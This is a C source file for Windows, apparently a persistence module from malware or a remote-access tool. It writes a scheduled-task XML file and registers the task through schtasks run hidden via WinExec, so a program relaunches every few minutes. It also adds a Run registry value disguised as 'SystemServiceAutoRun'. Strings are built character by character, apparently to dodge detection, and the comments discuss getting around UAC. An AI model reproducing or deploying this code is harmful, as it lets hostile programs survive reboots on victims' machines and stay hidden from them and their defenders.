#include <windows.h>
#include "Public.h"
#include <stdio.h>

#define TASKS_XML_FILE_NAME									"task_xml_file.txt"
#define MAX_SCHTASK_FILE_BUFFER_SIZE	0x4000


//SCHTASKS /CREATE /SC MINUTE /MO 1 /TN ACCOUNTANT /TR CALC.EXE /ST 00:00 /ET 23:59 /SD 2017/02/14 /ED 2017/02/15
//SCHTASKS /CREATE /SC MINUTE /MO 1 /TN 12344321 /TR NOTEPAD.EXE
int CreateScheduleInCmd(int iInterval, char* szTaskName, char* szPeFileName, char* strUserName, char* strComputerName, int iSystemVersion, char* lpworkpath)
{
	//win7 win8 all the trigger is false or true will be both ok
	char szTaskXmlFileForamt[] =
	{ "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\r\n"
	"<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\r\n"
	"<RegistrationInfo>\r\n"
	"<Date>%s</Date>\r\n"
	"<Author>%s</Author>\r\n"
	"</RegistrationInfo>\r\n"
	"<Triggers>\r\n"
	"<TimeTrigger>\r\n"
	"<Repetition>\r\n"
	"<Interval>PT%uM</Interval>\r\n"
	"<StopAtDurationEnd>false</StopAtDurationEnd>\r\n"
	"</Repetition>\r\n"
	"<StartBoundary>%s</StartBoundary>\r\n"
	"<Enabled>true</Enabled>\r\n"
	"</TimeTrigger>\r\n"
	"</Triggers>\r\n"
	"<Principals>\r\n"
	"<Principal id=\"Author\">\r\n"
	"<RunLevel>LeastPrivilege</RunLevel>\r\n"
	"<UserId>%s</UserId>\r\n"
	"<LogonType>InteractiveToken</LogonType>\r\n"
	"</Principal>\r\n"
	"</Principals>\r\n"
	"<Settings>\r\n"
	"<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\r\n"
	"<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\r\n"
	"<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\r\n"
	"<AllowHardTerminate>false</AllowHardTerminate>\r\n"
	"<StartWhenAvailable>false</StartWhenAvailable>\r\n"
	"<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\r\n"
	"<IdleSettings>\r\n"
	"<StopOnIdleEnd>false</StopOnIdleEnd>\r\n"
	"<RestartOnIdle>false</RestartOnIdle>\r\n"
	"</IdleSettings>\r\n"
	"<AllowStartOnDemand>false</AllowStartOnDemand>\r\n"
	"<Enabled>true</Enabled>\r\n"
	"<Hidden>false</Hidden>\r\n"
	"<RunOnlyIfIdle>false</RunOnlyIfIdle>\r\n"
	"<WakeToRun>false</WakeToRun>\r\n"
	"<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\r\n"
	"<Priority>7</Priority>\r\n"
	"</Settings>\r\n"
	"<Actions Context=\"Author\">\r\n"
	"<Exec>\r\n"
	"<Command>%s</Command>\r\n"
	"</Exec>\r\n"
	"</Actions>\r\n"
	"</Task>\r\n" };

	//msoobe can not create task in highest level but can create normal task in uac highest level 
	//LeastPrivilege
	//HighestAvailable
	//win10 all the trigger is false will be ok
	char szTaskXmlFileForamtWin10[] =
	{ "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\r\n\
	 <Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\r\n\
	 <RegistrationInfo>\r\n\
	 <Date>%s</Date>\r\n\
	 <Author>%s</Author>\r\n\
	 <URI>\\%s</URI>\r\n\
	 </RegistrationInfo>\r\n\
	 <Triggers>\r\n\
	 <TimeTrigger>\r\n\
	 <Repetition>\r\n\
	 <Interval>PT%uM</Interval>\r\n\
	 <StopAtDurationEnd>false</StopAtDurationEnd>\r\n\
	 </Repetition>\r\n\
	 <StartBoundary>%s</StartBoundary>\r\n\
	 <Enabled>true</Enabled>\r\n\
	 </TimeTrigger>\r\n\
	 </Triggers>\r\n\
	 <Principals>\r\n\
	 <Principal id=\"Author\">\r\n\
	 <RunLevel>LeastPrivilege</RunLevel>\r\n\
	 <UserId>%s</UserId>\r\n\
	 <LogonType>InteractiveToken</LogonType>\r\n\
	 </Principal>\r\n\
	 </Principals>\r\n\
	 <Settings>\r\n\
	 <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\r\n\
	 <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\r\n\
	 <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\r\n\
	 <AllowHardTerminate>false</AllowHardTerminate>\r\n\
	 <StartWhenAvailable>false</StartWhenAvailable>\r\n\
	 <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\r\n\
	 <IdleSettings>\r\n\
	 <StopOnIdleEnd>false</StopOnIdleEnd>\r\n\
	 <RestartOnIdle>false</RestartOnIdle>\r\n\
	 </IdleSettings>\r\n\
	 <AllowStartOnDemand>false</AllowStartOnDemand>\r\n\
	 <Enabled>true</Enabled>\r\n\
	 <Hidden>false</Hidden>\r\n\
	 <RunOnlyIfIdle>false</RunOnlyIfIdle>\r\n\
	 <WakeToRun>false</WakeToRun>\r\n\
	 <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\r\n\
	 <Priority>7</Priority>\r\n\
	 </Settings>\r\n\
	 <Actions Context=\"Author\">\r\n\
	 <Exec>\r\n\
	 <Command>%s</Command>\r\n\
	 </Exec>\r\n\
	 </Actions>\r\n\
	 </Task>\r\n" };

	SYSTEMTIME stTime = { 0 };
	GetLocalTime(&stTime);

	char szTime[MAX_PATH];
	char szTimeFormat[] = "%04u-%02u-%02uT%02u:%02u:%02u";
	lpwsprintfA(szTime, szTimeFormat, stTime.wYear, stTime.wMonth, stTime.wDay, stTime.wHour, stTime.wMinute, stTime.wSecond);

	char szAccountName[MAX_PATH];
	int iRet = lpwsprintfA(szAccountName, "%s\\%s", strComputerName, strUserName);
	//lstrcpyA(szAccountName,"system");

	char szTaskFileBuf[MAX_SCHTASK_FILE_BUFFER_SIZE];
	int iLen = 0;
	if (iSystemVersion >= SYSTEM_VERSION_WIN10)
	{
		iLen = sprintf_s(szTaskFileBuf, MAX_SCHTASK_FILE_BUFFER_SIZE, szTaskXmlFileForamtWin10, szTime, strUserName, szTaskName, iInterval, szTime, strUserName, szPeFileName);
	}
	else
	{
		iLen = sprintf_s(szTaskFileBuf, MAX_SCHTASK_FILE_BUFFER_SIZE, szTaskXmlFileForamt, szTime, strUserName, iInterval, szTime, szAccountName, szPeFileName);
	}

	char szTaskXmlFile[MAX_PATH];
	lstrcpyA(szTaskXmlFile, lpworkpath);
	lstrcatA(szTaskXmlFile, TASKS_XML_FILE_NAME);
	HANDLE hFileTask = lpCreateFileA(szTaskXmlFile, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFileTask == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	DWORD dwCnt = 0;
	int iRes = lpWriteFile(hFileTask, szTaskFileBuf, iLen, &dwCnt, 0);
	lpCloseHandle(hFileTask);
	if (iRes == FALSE)
	{
		return FALSE;
	}

	char szSysDir[MAX_PATH] = { 0 };
	lpGetSystemDirectoryA(szSysDir, MAX_PATH);
	char szScheduleCmdFormat[] = { 'c','m','d',' ','/','c',' ','%','s','\\','S','C','H','T','A','S','K','S','.','e','x','e',' ','/','C','R','E','A','T','E',' ','/','F',' ',
		'/','T','N',' ','%','s',' ','/','x','m','l',' ','%','s',/*' ','>','>','%','s',*/0 };
	char szCmd[1024];
	lpwsprintfA(szCmd, szScheduleCmdFormat, szSysDir, szTaskName, szTaskXmlFile);

	//the function below will cause uac protection!!!
	//ShellExecuteA(0,"runas","c:\\windows\\system32\\schtasks.exe","/create /f /tn wioserver /xml c:\\users\\liujinguang\\appdata\\local\temp\\mylittlebear\\task_xml_file.txt",0,SW_HIDE);
	iRet = WinExec(szCmd, SW_HIDE);
	if (iRet <= 31)
	{
		return FALSE;
	}

	char szShowInfo[1024];
	lpwsprintfA(szShowInfo, "run command to create task schedule:%s\r\n", szCmd);
	WriteLogFile(szShowInfo);

	//can not delete it here,i dont know why
	//#ifndef _DEBUG
	//iRet = lpDeleteFileA(szTaskXmlFile);
	//#endif

	//	char szCmd[MAX_PATH];
	//	char szScheduleCmd[] = {'S','C','H','T','A','S','K','S',' ','/','C','R','E','A','T','E',' ','/','F',' ','/','S','C',' ','M','I','N','U','T','E',' ',
	//		'/','M','O',' ','%','u',' ','/','T','N',' ','%','s',' ','/','T','R',' ','%','s',' ','/','r','u',' ','s','y','s','t','e','m',0};
	// 	char szScheduleCmd[] = {'c','m','d',' ','/','c',' ',
	// 		'S','C','H','T','A','S','K','S',' ','/','C','R','E','A','T','E',' ','/','F',' ','/','S','C',' ','M','I','N','U','T','E',' ',
	// 		'/','M','O',' ','%','u',' ','/','T','N',' ','%','s',' ','/','T','R',' ','%','s',' ','/','r','u',' ',
	// 		'%','s',0};
	//task account must be computer/user
	//	iRet = lpwsprintfA(szCmd,szScheduleCmd,iInterval,szTaskName,szPeFileName,szAccountName);


	//schtasks /change command need adin account and password,so here will be a failure result
	// 	char szScheduleChange[] = {'c','m','d',' ','/','c',' ','s','c','h','t','a','s','k','s',' ','/','c','h','a','n','g','e',' ',
	// 		'/','t','n',' ','%','s',' ','/','r','l',' ','h','i','g','h','e','s','t',0};
	// 	iRet = lpwsprintfA(szCmd,szScheduleChange,szTaskName);
	// 	iRet = lpWinExec(szCmd,SW_HIDE);
	// 	if (iRet <= 31)
	// 	{
	// 		iRet = lpRtlGetLastWin32Error();
	// 		char szShowInfo[512];
	// 		lpwsprintfA(szShowInfo,"CreateScheduleInCmd lpWinExec change error,the errorcode is:%u\r\n",iRet);
	// 		writeLog(szShowInfo);
	// 		return FALSE;
	// 	}

	return TRUE;
}




int SetBootAutoRunInRegistryRun(HKEY hMainKey, int iCpuBits, char* lpexefilepath)
{
	unsigned char szQueryValue[MAX_PATH];
	unsigned long iQueryLen = MAX_PATH;
	unsigned long iType = 0;

	//'Software\Microsoft\Windows\CurrentVersion\RunServicesOnce',0
	//'Software\Microsoft\Windows\CurrentVersion\RunServices',0
	//'Software\Microsoft\Windows\CurrentVersion\RunOnce',0
	char szKeyAutoRun[] = { 'S','o','f','t','w','a','r','e',0x5c,'M','i','c','r','o','s','o','f','t',0x5c,
		'W','i','n','d','o','w','s',0x5c,'C','u','r','r','e','n','t','V','e','r','s','i','o','n',0x5c,'R','u','n',0x5c,0 };

	char szValueAutoRun[] = { 'S','y','s','t','e','m','S','e','r','v','i','c','e','A','u','t','o','R','u','n',0 };

	char szKeyAutoRun64[] = { 'S','o','f','t','w','a','r','e',0x5c,'W','o','w','6','4','3','2','N','o','d','e',
		0x5c,'M','i','c','r','o','s','o','f','t',0x5c,
		'W','i','n','d','o','w','s',0x5c,'C','u','r','r','e','n','t','V','e','r','s','i','o','n',0x5c,'R','u','n',0x5c,0 };

	DWORD dwDisPos = 0;
	HKEY hKey = 0;
	int iRes = 0;
	if (iCpuBits == 64 && hMainKey == HKEY_LOCAL_MACHINE)
	{
		iRes = lpRegCreateKeyExA(hMainKey, szKeyAutoRun64, 0, REG_NONE, REG_OPTION_NON_VOLATILE, KEY_READ | KEY_WRITE, 0, &hKey, &dwDisPos);
		if (iRes != ERROR_SUCCESS)
		{
			return FALSE;
		}

		//if value is 234 ,it means out buffer is limit
		iRes = lpRegQueryValueExA(hKey, szValueAutoRun, 0, &iType, szQueryValue, &iQueryLen);
		if (iRes == ERROR_SUCCESS && strstr((char*)szQueryValue, lpexefilepath))
		{
			lpRegCloseKey(hKey);
			return TRUE;
		}
		else
		{
			iRes = GetLastError();
			//2 is error

			iRes = lpRegSetValueExA(hKey, szValueAutoRun, 0, REG_SZ, (unsigned char*)lpexefilepath, lplstrlenA(lpexefilepath));
			if (iRes != ERROR_SUCCESS)
			{
				lpRegCloseKey(hKey);
				return TRUE;
			}
			else
			{
				//RegFlushKey(hKey);
				lpRegCloseKey(hKey);
				return TRUE;
				//u can move it into setup folder
			}
		}
	}
	else
	{
		int iRes = lpRegCreateKeyExA(hMainKey, szKeyAutoRun, 0, REG_NONE, REG_OPTION_NON_VOLATILE, KEY_READ | KEY_WRITE, 0, &hKey, &dwDisPos);
		if (iRes == ERROR_SUCCESS)
		{
			iRes = lpRegQueryValueExA(hKey, szValueAutoRun, 0, &iType, szQueryValue, &iQueryLen);
			if (iRes == ERROR_SUCCESS && strstr((char*)szQueryValue, lpexefilepath))
			{
				WriteLogFile("SetBootAutoRunInRegistryRun lpRegQueryValueExA ok\r\n");
				lpRegCloseKey(hKey);
				return TRUE;
			}
			else
			{
				iRes = GetLastError();
				//2 is error

				iRes = lpRegSetValueExA(hKey, szValueAutoRun, 0, REG_SZ, (unsigned char*)lpexefilepath, lplstrlenA(lpexefilepath));
				if (iRes != ERROR_SUCCESS)
				{
					lpRegCloseKey(hKey);
					return TRUE;
				}
				else
				{
					//RegFlushKey(hKey);
					lpRegCloseKey(hKey);
					return TRUE;
					//u can move it into setup folder
				}
			}
		}
		else
		{
			WriteLogFile("SetBootAutoRunInRegistryRun lpRegCreateKeyExA error\r\n");
			return FALSE;
		}
	}

	return FALSE;
}